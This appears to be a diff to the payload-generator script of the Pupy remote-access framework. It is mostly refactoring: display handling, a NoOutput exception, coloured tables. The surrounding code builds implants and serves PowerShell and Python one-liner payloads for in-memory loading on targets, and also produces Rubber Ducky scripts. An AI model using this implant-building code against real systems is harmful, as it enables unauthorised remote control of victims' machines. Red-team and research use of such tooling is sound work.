@@ -45,7 +45,10 @@ from pupylib.PupyCredentials import Credentials, EncryptionError
 
 logger = getLogger('gen')
 
-HARDCODED_CONF_SIZE=65536
+HARDCODED_CONF_SIZE = 65536
+
+class NoOutput(Exception):
+    pass
 
 def get_edit_binary(display, path, conf, compressed_config=True, debug=False):
     logger.debug("generating binary %s with conf: %s"%(path, conf))
@@ -66,7 +69,7 @@ def get_edit_binary(display, path, conf, compressed_config=True, debug=False):
     elif len(offsets) > 1:
         raise Exception("Error: multiple offsets to edit the config have been found")
 
-    new_conf = marshal.dumps(compile(get_raw_conf(conf), '<config>', 'exec'))
+    new_conf = marshal.dumps(compile(get_raw_conf(display, conf), '<config>', 'exec'))
     uncompressed = len(new_conf)
     if compressed_config:
         new_conf = pylzma.compress(new_conf)
@@ -88,7 +91,7 @@ def get_edit_binary(display, path, conf, compressed_config=True, debug=False):
     binary = binary[0:offset]+new_conf+binary[offset+HARDCODED_CONF_SIZE:]
     return binary
 
-def get_raw_conf(conf, obfuscate=False, verbose=False):
+def get_raw_conf(display, conf, obfuscate=False, verbose=False):
 
     credentials = Credentials(role='client')
 
@@ -128,7 +131,6 @@ def get_raw_conf(conf, obfuscate=False, verbose=False):
         else:
             not_available.append(cred)
 
-
     display(
         List(available, bullet=Color('+', 'green'),
         caption=Success('Required credentials (found))')))
@@ -145,10 +147,11 @@ def get_raw_conf(conf, obfuscate=False, verbose=False):
 
     if verbose:
         config_table = [{
-            'KEY': k, 'VALUE': 'PRESENT' if k in ('offline_script') and v else v
-        } for k,v in conf]
+            'KEY': k, 'VALUE': 'PRESENT' if (k in ('offline_script') and v) else (
+                unicode(v) if type(v) not in (tuple,list,set) else ' '.join(v))
+        } for k,v in conf.iteritems() if v]
 
-        display(Table(config_table, ['KEY', 'VALUE'], 'Configuration'))
+        display(Table(config_table, ['KEY', 'VALUE'], Color('Configuration', 'yellow'), vspace=1))
 
     config = '\n'.join([
         'pupyimporter.pupy_add_package({})'.format(
@@ -221,7 +224,7 @@ def get_edit_apk(display, path, conf, compressed_config=None, debug=False):
     tempdir = tempfile.mkdtemp(prefix="tmp_pupy_")
     fd, tempapk = tempfile.mkstemp(prefix="tmp_pupy_")
     try:
-        packed_payload=pack_py_payload(get_raw_conf(conf), debug)
+        packed_payload=pack_py_payload(display, get_raw_conf(display, conf), debug)
         shutil.copy(path, tempapk)
 
         #extracting the python-for-android install tar from the apk
@@ -254,10 +257,10 @@ def get_edit_apk(display, path, conf, compressed_config=None, debug=False):
                 return apk.read()
 
         except subprocess.CalledProcessError, e:
-            display(Failed(e.output))
+            display(Error(e.output))
         except OSError, e:
             if e.errno == os.errno.ENOENT:
-                display(Failed('Please install jarsigner first.'))
+                display(Error('Please install jarsigner first.'))
             raise e
 
     finally:
@@ -420,10 +423,11 @@ def generate_binary_from_template(display, config, osname, arch=None, shared=Fal
 
 
     config_table = [{
-        'KEY': k, 'VALUE': str(v) if not k in ('offline_script') else 'PRESENT'
-    } for k,v in config.iteritems()]
+        'KEY': k, 'VALUE': 'PRESENT' if (k in ('offline_script') and v) else (
+                unicode(v) if type(v) not in (tuple,list,set) else ' '.join(v))
+    } for k,v in config.iteritems() if v]
 
-    display(Table(config_table, ['KEY', 'VALUE'], 'Configuration'))
+    display(Table(config_table, ['KEY', 'VALUE'], Color('Configuration', 'yellow'), vspace=1))
 
     return generator(display, template, config, compressed, debug), filename, makex
 
@@ -543,19 +547,21 @@ def pupygen(args, config, display):
                 'py_oneliner': 'same as \'py\' format but served over http',
                 'ps1': 'generate ps1 file which embeds pupy dll (x86-x64) and inject it to current process',
                 'ps1_oneliner': 'load pupy remotely from memory with a single command line using powershell'
-            }.iteritems()], ['FORMAT', 'DESCRIPTION'], 'Available formats (usage: -f <format>)'),
+            }.iteritems()], ['FORMAT', 'DESCRIPTION'], Color('Available formats (usage: -f <format>)', 'yellow')),
 
             Table([{
                 'TRANSPORT': name, 'DESCRIPTION': t.info
             } for name, t in transports.iteritems()],
-            ['TRANSPORT', 'DESCRIPTION'], 'Available transports (usage: -t <transport>)'),
+            ['TRANSPORT', 'DESCRIPTION'], Color('Available transports (usage: -t <transport>)', 'yellow')),
 
             Table([{
                 'SCRIPTLET': name, 'DESCRIPTION': sc.__doc__
             } for name, sc in scriptlets_dic.iteritems()],
-            ['SCRIPTLET', 'DESCRIPTION'], 'Available scriptlets (usage: -s <scriptlet>[,arg1=value1,arg2=value2]')
+            ['SCRIPTLET', 'DESCRIPTION'], Color(
+                'Available scriptlets (usage: -s <scriptlet>[,arg1=value1,arg2=value2]', 'yellow'))
         ]))
-        return
+
+        raise NoOutput()
 
     if args.workdir:
         os.chdir(args.workdir)
@@ -625,7 +631,7 @@ def pupygen(args, config, display):
     if args.delays_list:
         conf['delays'] = sorted(args.delays_list, key=lambda x: x[0])
 
-    outpath=args.output
+    outpath = args.output
 
     if not os.path.isdir(args.output_dir):
         display(Success('Creating the local folder {} for generating payloads'.format(repr(args.output_dir))))
@@ -673,7 +679,7 @@ def pupygen(args, config, display):
 
         outpath = outfile.name
 
-    elif args.format=="py" or args.format=="pyinst":
+    elif args.format in ('py', 'pyinst'):
         linux_modules = ''
         if not outpath:
             outfile = tempfile.NamedTemporaryFile(
@@ -690,9 +696,9 @@ def pupygen(args, config, display):
 
             outfile = open(outpath, 'w+b')
 
-        if args.format=="pyinst":
+        if args.format == 'pyinst':
             linux_modules = getLinuxImportedModules()
-        packed_payload = pack_py_payload(get_raw_conf(conf, verbose=True), args.debug)
+        packed_payload = pack_py_payload(display, get_raw_conf(display, conf, verbose=True), args.debug)
 
         outfile.write('\n'.join([
             '#!/usr/bin/env python',
@@ -704,16 +710,20 @@ def pupygen(args, config, display):
 
         outpath = outfile.name
 
-    elif args.format=="py_oneliner":
-        packed_payload = pack_py_payload(get_raw_conf(conf, verbose=True), args.debug)
-        i=conf["launcher_args"].index("--host")+1
-        link_ip=conf["launcher_args"][i].split(":",1)[0]
-        serve_payload(packed_payload, link_ip=link_ip, port=args.oneliner_listen_port)
+    elif args.format == 'py_oneliner':
+        packed_payload = pack_py_payload(display, get_raw_conf(display, conf, verbose=True), args.debug)
+        i = conf["launcher_args"].index("--host")+1
+        link_ip = conf["launcher_args"][i].split(":",1)[0]
 
-    elif args.format=="ps1":
+        display(Warn('Press Ctrl+C to stop server'))
+        serve_payload(display, packed_payload, link_ip=link_ip, port=args.oneliner_listen_port)
+
+        raise NoOutput()
+
+    elif args.format == 'ps1':
         outpath = generate_ps1(display, conf, outpath=outpath, output_dir=args.output_dir, both=True)
 
-    elif args.format=="ps1_oneliner":
+    elif args.format == 'ps1_oneliner':
         if conf['launcher'] in ["connect", "auto_proxy"]:
             from pupylib.payloads.ps1_oneliner import serve_ps1_payload
             link_ip=conf["launcher_args"][conf["launcher_args"].index("--host")+1].split(":",1)[0]
@@ -727,36 +737,50 @@ def pupygen(args, config, display):
             else:
                 useTargetProxy = False
 
-            serve_ps1_payload(conf, link_ip=link_ip, port=args.oneliner_listen_port, useTargetProxy=useTargetProxy, sslEnabled=sslEnabled, nothidden=args.oneliner_nothidden)
-        elif conf['launcher'] == "bind":
+            display(Warn('Press Ctrl+C to stop server'))
+            serve_ps1_payload(
+                display, conf,
+                link_ip=link_ip, port=args.oneliner_listen_port,
+                useTargetProxy=useTargetProxy, sslEnabled=sslEnabled,
+                nothidden=args.oneliner_nothidden)
+            raise NoOutput()
+
+        elif conf['launcher'] == 'bind':
             from pupylib.payloads.ps1_oneliner import send_ps1_payload
             outpath, target_ip, bind_port = "", None, None
             bind_port=conf["launcher_args"][conf["launcher_args"].index("--port")+1]
             if '--oneliner-host' in conf['launcher_args']:
                 target_ip=conf['launcher_args'][conf['launcher_args'].index('--oneliner-host')+1]
-                send_ps1_payload(conf, bind_port=bind_port, target_ip=target_ip, nothidden=args.oneliner_nothidden)
+                send_ps1_payload(
+                    display, conf,
+                    bind_port=bind_port, target_ip=target_ip, nothidden=args.oneliner_nothidden)
+
                 display(Success(
                     'You have to connect manually to the target {} '
                     'with "connect --host {0}:{1}"'.format(target_ip, bind_port)))
+
+                raise NoOutput()
             else:
                 raise ValueError('You have to give me the --oneliner-host argument')
         else:
             raise ValueError('ps1_oneliner with {0} mode is not implemented yet'.format(conf['launcher']))
 
-    elif args.format=='rubber_ducky':
-        rubber_ducky(conf).generateAllForOStarget()
+    elif args.format == 'rubber_ducky':
+        rubber_ducky(display, conf, config).generateAllForOStarget()
+        raise NoOutput()
 
     else:
         raise ValueError("Type %s is invalid."%(args.format))
 
-    display('OUTPUT_PATH: {}'.format(os.path.abspath(outpath)))
-    display('SCRIPTLETS:  {}'.format(args.scriptlet))
-    display('DEBUG:       {}'.format(args.debug))
+    display(Success('OUTPUT_PATH: {}'.format(os.path.abspath(outpath))))
+    display(Success('SCRIPTLETS:  {}'.format(args.scriptlet)))
+    display(Success('DEBUG:       {}'.format(args.debug)))
 
     return os.path.abspath(outpath)
 
 if __name__ == '__main__':
     from pupylib.utils.term import hint_to_text
+    from traceback import print_exc
 
     def display(data):
         print hint_to_text(data)
@@ -766,11 +790,20 @@ if __name__ == '__main__':
 
     parser = get_parser(argparse.ArgumentParser, config)
     try:
-        pupygen(parser.parse_args(), config, display)
-    except InvalidOptions:
+        args = parser.parse_args()
+        pupygen(args, config, display)
+
+    except NoOutput:
         sys.exit(0)
+
+    except InvalidOptions:
+        sys.exit(1)
+
     except (ValueError, EncryptionError), e:
+        if args.debug:
+            print_exc()
         display(Error(e))
+
     except Exception, e:
-        logger.exception(e)
+        print_exc()
         sys.exit(str(e))
